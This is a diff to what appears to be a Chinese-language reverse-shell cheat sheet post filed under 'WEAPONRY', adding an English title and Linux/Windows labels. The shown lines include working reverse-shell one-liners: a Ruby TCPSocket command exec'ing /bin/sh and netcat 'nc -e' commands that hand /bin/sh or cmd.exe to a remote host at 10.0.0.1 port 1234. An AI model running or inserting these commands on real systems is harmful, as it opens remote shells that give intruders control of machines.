@@ -4,7 +4,7 @@ date: 2020-11-23 23:08:12
 category: WEAPONRY
 ---
 
-# 反弹 shell
+# Reverse Shell Cheat Sheet
 
 > 升级成半交互式 tty
 > ``` bash
@@ -50,7 +50,9 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 ### Netcat
 不一定所有 nc 都能用哦。
 ``` bash
+# Linux
 nc -e /bin/sh 10.0.0.1 1234
+# Windows
 nc -e cmd.exe 10.0.0.1 1234
 ```
 Netcat-openbsd 版不支持 -e，这时候用下面的。
